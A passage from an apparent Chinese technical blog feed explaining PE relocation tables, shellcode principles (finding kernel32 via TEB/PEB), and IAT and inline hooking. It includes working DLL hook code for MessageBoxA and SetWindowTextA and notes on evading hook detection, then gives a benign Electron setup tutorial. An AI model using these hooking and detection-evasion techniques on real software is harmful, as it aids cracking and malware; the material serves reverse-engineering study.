<blockquote>
<p>这里的B模块一旦没有占住它原来的这一段内存，这里的硬编码就会失效，导致程序没法正确的给x赋值。</p>
<p>因此这就需要用重定位表来修正。</p>
<p>重定位表中要记录的就是这些需要修正的地方的地址。</p>
<p>所以有了重定位表，就不用担心这段程序如果没占住他的ImageBase会不会出问题</p>
</blockquote>
<p><img src="/2024/03/20/PE/image-20240517152658313.png" alt="image-20240517152658313"></p>
<p>重定位表的位置信息与导入表、导出表一样，在扩展PE头最后一个成员中的第6个结构体，结构体的成员与导入表、导出表一样，分别表示重定位表的RVA和Size</p>
<img src="/2024/03/20/PE/image-20240516205416126.png" alt="image-20240516205416126" style="zoom:65%;">

<p>重定位表中有一个结构体，它一共有8字节：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_BASE_RELOCATION</span> &#123;</span><br><span class="line">    DWORD VirtualAddress; ``<span class="comment">// RVA</span></span><br><span class="line">    DWORD SizeOfBlock;</span><br><span class="line">&#125; IMAGE_BASE_RELOCATION;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_BASE_RELOCATION ，* PIMAGE_BASE_RELOCATION;</span><br></pre></td></tr></table></figure>

<p>但是完整的重定位表还包含了很多重定位项，所以整体大小是没有一个统一标准的，需要根据实际情况。该结构体的第一个成员VirtualAddress表示基地址，<strong>第二个成员SizeOfBlock也就是减去当前结构体的大小之后其他的所有重定位项加起来的大小。</strong></p>
<p>这也就表示每一个重定位表是IMAGE_BASE_RELOCATION结构体开始，跟着的就是重定位项。</p>
<p>从理论上来说，重定位表中存储的项应该都是4字节大小的地址，但是这样一旦需要修改的地址多了，就会占用大量的空间，所以重定位表就做了一些优化，假设你现在有这几个地址需要修正：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x800123</span><br><span class="line">0x800456</span><br><span class="line">0x800789</span><br></pre></td></tr></table></figure>

<p>那么优化之后，IMAGE_BASE_RELOCATION结构体的第一个成员存储的就是0x800000，而这个结构体之后的每2字节存储就包含0x123、0x456、0x789，这样就大大的节省了空间。同时，这也就说明重定位表的实际大小为IMAGE_BASE_RELOCATION结构体（8字节）+N*2字节。</p>
<p>重定位表是按照一个物理页（4KB）进行存储的，也就表示一个4KB内存有需要修正的位置，就会有一个重定位块，一个重定位表只管自己当前的物理页的重定位。</p>
<p>但需要注意的是由于内存对齐的缘故，在重定位表中还是有很多的无用项的，<strong>所以需要判断当前重定位项（2字节）的高四位是否为3，如果是那么低12位就是偏移量，最后的地址也就是VirtualAddress+低12位，如果不是就表示这是无所谓的值。</strong></p>
<h2 id="PE实践"><a href="#PE实践" class="headerlink" title="PE实践"></a>PE实践</h2><h3 id="注入ShellCode"><a href="#注入ShellCode" class="headerlink" title="注入ShellCode"></a>注入ShellCode</h3><p>什么事ShellCode？不依赖环境，放到任何地方都可以执行的机器码。如果机器码具备这个特征，就可以称之为ShellCode。</p>
<p>ShellCode编写原则</p>
<p>&lt;1&gt; 不能有全局变量</p>
<p>&lt;2&gt; 不能使用常量字符串</p>
<p>如果ShellCode中写的是</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> Injstr[] = <span class="string">&quot;ShellCode&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>这样的代码在反汇编中程序会先把吧ShellCode放到常量区，然后用的时候再将这个字符串的地址复制出来。但是ShellCode不能依赖常量区，所以应该换一种方式直接将这个字符串放到堆栈中。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> Injstr[] = &#123;<span class="string">&#x27;S&#x27;</span>,<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;C&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;\0&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>

<p>这样写出来的代码在汇编中就会直接放到堆栈中，而不是放在常量区。</p>
<p>&lt;3&gt; 不能使用系统调用</p>
<p>解决方案：</p>
<p>​		FS:[0] -&gt; TEB</p>
<p>​		FS:[0x30] -&gt; PEB</p>
<p>找到PEB后<img src="/2024/03/20/PE/image-20240519090745097.png" alt="image-20240519090745097"></p>
<p>在找到其中的+0xc的位置，找到右边这个结构体，找到右侧这三个链表。</p>
<p><img src="/2024/03/20/PE/image-20240519091248845.png" alt="image-20240519091248845"></p>
<p>这样就可以通过DLL的名字找到自己想要的DLL（Unicode）</p>
<p>比如要找LoadLibrary或者GetProcAddress这两个函数，这两个函数时kernel32,dll里面的函数，所以要找到LoadLibrary要先找到kernel32这个dll</p>
<p>然后可以遍历上面这个结构体，遍历+0x24这个地方如果是kernel32.dll的话，就把+0x18这里的DllBase拿过来，就找到了kernel32.dll模块的基地址</p>
<p>比如LoadLibrary(“user32.dll”)得到一个句柄，这个返回的句柄就是这个模块的基地址。</p>
<p>所以现找TEB，再找PEB，然后找到三个链表，再遍历链表，找到kernel32.dll，找到kernel32.dll了之后还不能直接使用，还要找到这个函数在什么地方</p>
<p>因为PE文件有一张导出表，并且已经找到了kenel32.dll的首地址，所以通过找内存能找到kernel32的导出表，然后通过查询导出表，就能找到需要用的函数。然后只要有了LoadLibrary和GetProcAddress这两个函数，想找到其他的函数就都行了。这样就能做到在自己的函数中不依赖导入表，想用谁就用谁</p>
<p>&lt;4&gt; 不能嵌套调用其他函数</p>
<blockquote>
<p>第二个和第三个其实是可以解决掉的</p>
</blockquote>
<h3 id="HOOK"><a href="#HOOK" class="headerlink" title="HOOK"></a>HOOK</h3><p>什么是HOOK，HOOK是用来获取、更改程序执行时的某些数据，或者是用于更改程序执行流程的一种技术。</p>
<p>HOOK的两种主要形式：</p>
<p>1.该函数代码 -&gt; INLINE HOOK</p>
<p>2.改函数地址<br>IAT HOOK<br>SSDT HOOK<br>IDT HOOK<br>EAT HOOK<br>IRP HOOK<br>……</p>
<p>​							</p>
<h3 id="IAT-HOOK"><a href="#IAT-HOOK" class="headerlink" title="IAT HOOK"></a>IAT HOOK</h3><p>IAT（Import Address Table）导入地址表HOOK。</p>
<p>比如在一个程序中有一个MessageBox，现在使用HOOK将MessageBox中的值改调，或者让这个程序在执行MessageBox的时候执行自己的一个函数，这时候就用IAT HOOK。</p>
<p><img src="/2024/03/20/PE/image-20240519103431074.png" alt="image-20240519103431074"></p>
<p>比如这样一个间接调用，call后面跟的是一个ptr，一块内存。此时可以HOOK将这个内存地址中存储的函数地址改成自己函数的地址。</p>
<p><strong>IAT HOOK步骤：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、在Dll里构造Detour函数(也就是我们自己的函数)</span><br><span class="line">2、获取Target函数地址，并找到Target函数所在的IAT的地址</span><br><span class="line">3、保存原始的IAT地址和IAT地址所存储的内容</span><br><span class="line">4、修改IAT地址中的数据(前提：修改内存属性为可写)</span><br><span class="line">5、恢复IAT</span><br></pre></td></tr></table></figure>



<h3 id="INLINE-HOOK"><a href="#INLINE-HOOK" class="headerlink" title="INLINE HOOK"></a>INLINE HOOK</h3><p>IAT Hook缺点：</p>
<p>&lt;1&gt; 容易被检测到</p>
<p>&lt;2&gt; 只能Hook IAT表里面的函数 -&gt; 有50个WindowsAPI的函数，还有50个自己写的函数，这些自己写的函数就没法Hook，因为自己写的函数在IAT表中是没有的。</p>
<p>INLINE HOOK就是直接修改exe的硬编码。</p>
<p>比如现在有一个程序：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">plus</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> a;</span><br><span class="line">	a = x + y;</span><br><span class="line">	<span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, plus(<span class="number">1</span>, <span class="number">2</span>));</span><br><span class="line"></span><br><span class="line">	system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过Hook修改plus()函数执行时，堆栈中的值。使2+3&#x3D; 5。</p>
<p><img src="/2024/03/20/PE/image-20240523102541164.png" alt="image-20240523102541164"></p>
<p>从这个call开始修改，让这里先jmp到0x30194A这里，执行自己的代码</p>
<img src="/2024/03/20/PE/image-20240523102621892.png" alt="image-20240523102621892" style="zoom:50%;">

<p>有三个字节没有被占用，所以用nop填充</p>
<img src="/2024/03/20/PE/image-20240523104330985.png" alt="image-20240523104330985" style="zoom:50%;">

<p>因为jmp跳转之后不会改变esp的值，所以跳完之后直接esp和esp+0x4直接找到两个push进来的值，直接对这两个值进行修改。</p>
<p>修改两个值：<img src="/2024/03/20/PE/image-20240523105118207.png" alt="image-20240523105118207"></p>
<p>因为本来覆盖了一句汇编call 0xxxxxxx所以在这里要把它先填回来。</p>
<p><img src="/2024/03/20/PE/image-20240523105329269.png" alt="image-20240523105329269"></p>
<p>修改完之后再jmp执行回来。</p>
<p>最终改完就是这样<img src="/2024/03/20/PE/image-20240523111015872.png" alt="image-20240523111015872"></p>
<p>执行完后，堆栈中变成了0x3和0x4</p>
<p><img src="/2024/03/20/PE/image-20240523111057776.png" alt="image-20240523111057776"></p>
<p><img src="/2024/03/20/PE/image-20240523111531311.png" alt="image-20240523111531311"></p>
<p>执行后就是0x7</p>
<p>原理是这样，需要用代码来实现。</p>
<p>还是以MessageBoxA来举例。这里HookMessageBoxA这个函数</p>
<p>代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">DWORD jump = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">__declspec(naked) <span class="type">void</span> <span class="title function_">Transfer</span><span class="params">()</span>&#123;</span><br><span class="line">	__asm&#123;</span><br><span class="line">		mov edi, edi</span><br><span class="line">		push ebp</span><br><span class="line">		mov ebp, esp</span><br><span class="line">		mov ebx, jump</span><br><span class="line">		jmp ebx</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> APIENTRY <span class="title function_">DllMain</span><span class="params">(HANDLE handle, DWORD dword, LPVOID lpvoid)</span></span><br><span class="line">&#123;</span><br><span class="line">	HMODULE hwnd = GetModuleHandle(TEXT(<span class="string">&quot;user32.dll&quot;</span>));</span><br><span class="line">	DWORD base = (DWORD)GetProcAddress(hwnd, <span class="string">&quot;MessageBoxA&quot;</span>);</span><br><span class="line">	DWORD oldProtect = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (VirtualProtect((LPVOID)base, <span class="number">5</span>, PAGE_EXECUTE_READWRITE, &amp;oldProtect))</span><br><span class="line">	&#123;</span><br><span class="line">		DWORD value = (DWORD)Transfer - base - <span class="number">5</span>;</span><br><span class="line">		jump = base + <span class="number">0x1a</span>;</span><br><span class="line">		__asm&#123;</span><br><span class="line">			mov eax, base</span><br><span class="line">			mov byte ptr[eax], <span class="number">0xe9</span></span><br><span class="line">			inc eax</span><br><span class="line">			mov ebx, value</span><br><span class="line">			mov dword ptr[eax], ebx</span><br><span class="line">		&#125;</span><br><span class="line">		VirtualProtect((LPVOID)base, <span class="number">5</span>, oldProtect, &amp;oldProtect);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再比如hook修改MessageBoxA的标题：</p>
<p>MessageBoxA在设置窗口标题时会使用SetWindowTextA这个API函数，可以通过Hook这个函数，并修改这个函数调用时的值，从而实现指定窗口的标题，</p>
<p>代码实现：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">DWORD jump = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">__declspec(naked) <span class="type">bool</span> _stdcall <span class="title function_">Transfer</span><span class="params">(HWND hwnd, LPCSTR lpString)</span>&#123;</span><br><span class="line">	__asm&#123;</span><br><span class="line">		mov edi, edi</span><br><span class="line">		push ebp</span><br><span class="line">		mov ebp, esp</span><br><span class="line">		mov ebx, jump</span><br><span class="line">		jmp ebx</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">bool</span> __stdcall <span class="title function_">MySetWindowTextA</span><span class="params">(HWND hwnd, LPCSTR lpString)</span>&#123;</span><br><span class="line">	<span class="type">char</span> * lpText = <span class="string">&quot;LyShark 破解版&quot;</span>;</span><br><span class="line">	<span class="keyword">return</span> Transfer(hwnd, lpText);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> APIENTRY <span class="title function_">DllMain</span><span class="params">(HANDLE handle, DWORD dword, LPVOID lpvoid)</span></span><br><span class="line">&#123;</span><br><span class="line">	HMODULE hwnd = GetModuleHandle(TEXT(<span class="string">&quot;user32.dll&quot;</span>));</span><br><span class="line">	DWORD base = (DWORD)GetProcAddress(hwnd, <span class="string">&quot;SetWindowTextA&quot;</span>);</span><br><span class="line">	DWORD oldProtect = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (VirtualProtect((LPVOID)base, <span class="number">5</span>, PAGE_EXECUTE_READWRITE, &amp;oldProtect))</span><br><span class="line">	&#123;</span><br><span class="line">		DWORD value = (DWORD)MySetWindowTextA - base - <span class="number">5</span>;</span><br><span class="line">		jump = base + <span class="number">5</span>;</span><br><span class="line">		__asm&#123;</span><br><span class="line">			mov eax, base</span><br><span class="line">			mov byte ptr[eax], <span class="number">0xe9</span></span><br><span class="line">			inc eax</span><br><span class="line">			mov ebx, value</span><br><span class="line">			mov dword ptr[eax], ebx</span><br><span class="line">		&#125;</span><br><span class="line">		VirtualProtect((LPVOID)base, <span class="number">5</span>, oldProtect, &amp;oldProtect);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><a href="https://www.cnblogs.com/LyShark/p/11692436.html">C&#x2F;C++ Inline Hook 钩子编写技巧 - lyshark - 博客园 (cnblogs.com)</a></p>
<h3 id="INLINE-HOOK-改进版"><a href="#INLINE-HOOK-改进版" class="headerlink" title="INLINE HOOK 改进版"></a>INLINE HOOK 改进版</h3><p>当自己需要写的函数非常复杂的时候，比如想要打印一个字符串，这时候用纯汇编自己编写就非常复杂。所以采用调用函数的方法。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">MyMessageBox</span><span class="params">(HWND hwnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType)</span></span><br><span class="line">&#123;</span><br><span class="line">	TCHAR szBuffer[<span class="number">0x100</span>];</span><br><span class="line">	<span class="built_in">sprintf</span>(szBuffer,<span class="string">&quot;%x %s %s %x \n&quot;</span>, hwnd, lpText, lpCaption, uType);</span><br><span class="line">	OutputDebugString(szBuffer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __declspec(naked) NewMessageBox()</span><br><span class="line">&#123;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// 1.保存寄存器</span></span><br><span class="line">		pushad</span><br><span class="line">		pushfd</span><br><span class="line">        <span class="comment">// 2.调用处理函数</span></span><br><span class="line">        push DWORD PTR SS:[esp+<span class="number">0x28</span>]</span><br><span class="line">        push DWORD PTR SS:[esp+<span class="number">0x30</span>]</span><br><span class="line">        push DWORD PTR SS:[esp+<span class="number">0x38</span>]</span><br><span class="line">        push DWORD PTR SS:[esp+<span class="number">0x40</span>]</span><br><span class="line">        call MyMessageBox</span><br><span class="line">        add esp, <span class="number">0x10</span></span><br><span class="line">        <span class="comment">// 3.恢复寄存器</span></span><br><span class="line">        popfd</span><br><span class="line">        popad</span><br><span class="line">        <span class="comment">// 4.执行覆盖的代码</span></span><br><span class="line">        mov edi, edi</span><br><span class="line">        push ebp</span><br><span class="line">        mov ebp, esp</span><br><span class="line">        <span class="comment">// 5.返回执行</span></span><br><span class="line">        push dwHookAddress</span><br><span class="line">        add dword ptr ds:[esp], PATCH_LENGTH</span><br><span class="line">        retn</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>INLINE HOOK检测</strong></p>
<p>过E9检测，因为在INLINE Hook中一般使用jmp跳转到某个指定的地方来执行自己的指令，而jmp的机器码就是E9，所以可以改为使用CALL + RET的方法避免E9的检测，不过这也只是最简单的一种检测的攻防。</p>
<h3 id="HOOK攻防"><a href="#HOOK攻防" class="headerlink" title="HOOK攻防"></a>HOOK攻防</h3><p>HOOK攻防常用手段</p>
<p>阶段一：</p>
<p>​		（防）检测JMP(E9)、检测跳转范围</p>
<p>​		（破）绕</p>
<p>阶段二：</p>
<p>​		（防）写一个进程，对自己的代码进行全代码校验、CRC校验</p>
<p>​		（破）修改监测代码、挂起检测函数</p>
<p>阶段三：进程A检测进程B，进程B检测进程C，进程C检测进程D，进程D进行全代码校验。</p>
<p>​		（防）先对相关API全代码校验，多个线程互相检测，并检测线程是否在活动中</p>
<p>​		（破）使用瞬时钩子&#x2F;硬件钩子</p>
<h3 id="瞬时HOOK过检测"><a href="#瞬时HOOK过检测" class="headerlink" title="瞬时HOOK过检测"></a>瞬时HOOK过检测</h3>]]></content>
      <categories>
        <category>PE</category>
      </categories>
      <tags>
        <tag>PE</tag>
        <tag>汇编</tag>
      </tags>
  </entry>
  <entry>
    <title>Electron</title>
    <url>/2025/01/23/Electron/</url>
    <content><![CDATA[<div style="width: 100%; height: auto; font-size: 40px; margin-top:10px; color: #545454; font-weight: 650">
    Electron 桌面应用开发
</div>



<span id="more"></span>

<h1 id="构建"><a href="#构建" class="headerlink" title="构建"></a>构建</h1><p>使用npm构建经常报错，使用以下方法构建</p>
<p>1.打开npm配置文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm config edit</span><br></pre></td></tr></table></figure>

<p>2.将以下内容填入，如果已有该字段则修改</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">registry=https://registry.npmmirror.com</span><br><span class="line">electron_mirror=https://cdn.npmmirror.com/binaries/electron/</span><br><span class="line">electron_builder_binaries_mirror=https://npmmirror.com/mirrors/electron-builder-binaries/</span><br></pre></td></tr></table></figure>

<p>3.构建</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install electron --save-dev</span><br></pre></td></tr></table></figure>

<p>构建成功</p>
<p><img src="/2025/01/23/Electron/image-20250123232527154.png" alt="image-20250123232527154"></p>
<h1 id="运行原理"><a href="#运行原理" class="headerlink" title="运行原理"></a>运行原理</h1><p>下面通过源码阅读的方式简要梳理Electron应用程序的原理</p>
<p>首先<code>git clone https://github.com/electron/electron-quick-start</code>，下载一个demo示例</p>
<p>使用<code>npm start</code>，就可以运行这个Electron应用程序</p>
<img src="/2025/01/23/Electron/image-20250123232946907.png" alt="image-20250123232946907" style="zoom:33%;">

<p>首先看前两行</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; app, <span class="title class_">BrowserWindow</span> &#125; = <span class="built_in">require</span>(<span class="string">&#x27;electron&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;node:path&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>以上从require能够看出，肯定是支持node的一些模块，我们只需要查看文档，知道app、BrowserWindow这些有什么样的功能然后对他进行调用就可以了</p>
<p>再往下是一个function</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">createWindow</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> mainWindow = <span class="keyword">new</span> <span class="title class_">BrowserWindow</span>(&#123;</span><br><span class="line">        <span class="attr">width</span>: <span class="number">800</span>,</span><br><span class="line">        <span class="attr">height</span>: <span class="number">600</span>,</span><br><span class="line">        <span class="attr">webPreferences</span>: &#123;</span><br><span class="line">            <span class="attr">preload</span>: path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;preload.js&#x27;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    mainWindow.<span class="title function_">loadFile</span>(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个就是主进程创建的一个窗口，<code>webPreferences</code>暂时不知道是干什么的，先不管，但是能知道实例化了一个窗口，有我们自定义的宽度和高度</p>
<p>最后一行的mainWindow.loadFile是加载了加载了一个界面，也就是当前目录下的index.html文件</p>
<p>继续往下看</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">whenReady</span>().<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">createWindow</span>()</span><br><span class="line">    app.<span class="title function_">on</span>(<span class="string">&#x27;activate&#x27;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title class_">BrowserWindow</span>.<span class="title function_">getAllWindows</span>().<span class="property">length</span> === <span class="number">0</span>) <span class="title function_">createWindow</span>()</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">on</span>(<span class="string">&#x27;window-all-closed&#x27;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (process.<span class="property">platform</span> !== <span class="string">&#x27;darwin&#x27;</span>) app.<span class="title function_">quit</span>()</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>这里就先只看前几行，app这个就相当于我们开发的整个应用程序，whenReady后返回Promise再调用它成功的result，在他里面就调用了createWindow函数，走到这一行，我们程序加载窗口界面这一套东西就算是出来了，后面app.on的内容就是一些针对程序不同生命周期的函数，以后再说。</p>
<p>再看一下index.html</p>
<p><img src="/2025/01/23/Electron/image-20250123234208692.png" alt="image-20250123234208692"></p>
<p>我们在第一次运行这个程序的时候看到有一些数值，比如版本之类，但是前端是没有写出来的，这些前端中的数据是可以通过nodejs来获取的，此时可以看一下preload.js，这里面就是获取数据的操作：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;DOMContentLoaded&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="title function_">replaceText</span> = (<span class="params">selector, text</span>) =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> element = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(selector)</span><br><span class="line">        <span class="keyword">if</span> (element) element.<span class="property">innerText</span> = text</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> type <span class="keyword">of</span> [<span class="string">&#x27;chrome&#x27;</span>, <span class="string">&#x27;node&#x27;</span>, <span class="string">&#x27;electron&#x27;</span>]) &#123;</span><br><span class="line">        <span class="title function_">replaceText</span>(<span class="string">`<span class="subst">$&#123;type&#125;</span>-version`</span>, process.<span class="property">versions</span>[type])</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>至此，基本的运行流程就是这样，下面自己创建一个Electron项目（看不懂也没关系，学完下面的就看懂了）</p>
<h1 id="项目搭建"><a href="#项目搭建" class="headerlink" title="项目搭建"></a>项目搭建</h1><p>首先自己建一个项目，然后<code>npm install electron --save-dev</code>，跟官方示例一样，将package.json里的启动项改成main.js，然后创建一个main.js</p>
<img src="/2025/01/23/Electron/image-20250123234806003.png" alt="image-20250123234806003" style="zoom:33%;">

<h2 id="生命周期"><a href="#生命周期" class="headerlink" title="生命周期"></a>生命周期</h2><table>
<thead>
<tr>
<th>Listen On</th>
<th>Trigger</th>
</tr>
</thead>
<tbody><tr>
<td>ready</td>
<td>程序启动时最先触发的事件</td>
</tr>
<tr>
<td>dom-ready</td>
<td>页面上的文本加载完毕后触发，之后可以进行对页面上元素的操作</td>
</tr>
<tr>
<td>did-finish-load</td>
<td>导航完成时触发，即选项卡的旋转器将停止旋转，并指派onload事件后</td>
</tr>
<tr>
<td>window-all-closed</td>
<td>所有窗口都关闭时触发</td>
</tr>
<tr>
<td>before-quit</td>
<td>在关闭窗口之前触发</td>
</tr>
<tr>
<td>will-quit</td>
<td>在关闭窗口都已经关闭并且应用程序退出之前</td>
</tr>
<tr>
<td>quit</td>
<td>当所有窗口被关闭时触发</td>
</tr>
<tr>
<td>closed</td>
<td>当窗口关闭时发出。收到此事件后，应删除对窗口的引用，并避免再使用它</td>
</tr>
</tbody></table>
<h3 id="ready"><a href="#ready" class="headerlink" title="ready"></a>ready</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">on</span>(<span class="string">&quot;ready&quot;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;ready&quot;</span>)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h3 id="dom-ready"><a href="#dom-ready" class="headerlink" title="dom-ready"></a>dom-ready</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">on</span>(<span class="string">&quot;ready&quot;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;ready&quot;</span>)；</span><br><span class="line">    mainWindow.<span class="property">webContents</span>.<span class="title function_">on</span>(<span class="string">&#x27;dom-ready&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;dom-ready&quot;</span>)</span><br><span class="line">        <span class="comment">//一个框架中的文本加载完成后触发该事件。</span></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h3 id="did-finish-load"><a href="#did-finish-load" class="headerlink" title="did-finish-load"></a>did-finish-load</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">on</span>(<span class="string">&quot;ready&quot;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;ready&quot;</span>)；</span><br><span class="line">    mainWindow.<span class="property">webContents</span>.<span class="title function_">on</span>(<span class="string">&#x27;dom-ready&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;dom-ready&quot;</span>)</span><br><span class="line">        <span class="comment">//一个框架中的文本加载完成后触发该事件。</span></span><br><span class="line">    &#125;)</span><br><span class="line">    mainWindow.<span class="property">webContents</span>.<span class="title function_">on</span>(<span class="string">&quot;did-finish-load&quot;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;did-finish-load&quot;</span>)  <span class="comment">//导航完成时触发，即选项卡的旋转器将停止旋转，并指派onload事件后。</span></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h3 id="window-all-closed"><a href="#window-all-closed" class="headerlink" title="window-all-closed"></a>window-all-closed</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">on</span>(<span class="string">&#x27;window-all-closed&#x27;</span>, <span class="function">() =&gt;</span> &#123; <span class="comment">//当所有窗口被关闭时触发</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;window-all-closed&quot;</span>)</span><br><span class="line">    app.<span class="title function_">quit</span>()</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h3 id="before-quit"><a href="#before-quit" class="headerlink" title="before-quit"></a>before-quit</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">on</span>(<span class="string">&#x27;before-quit&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;before-quit&quot;</span>)</span><br><span class="line">    <span class="comment">//在关闭窗口之前触发</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

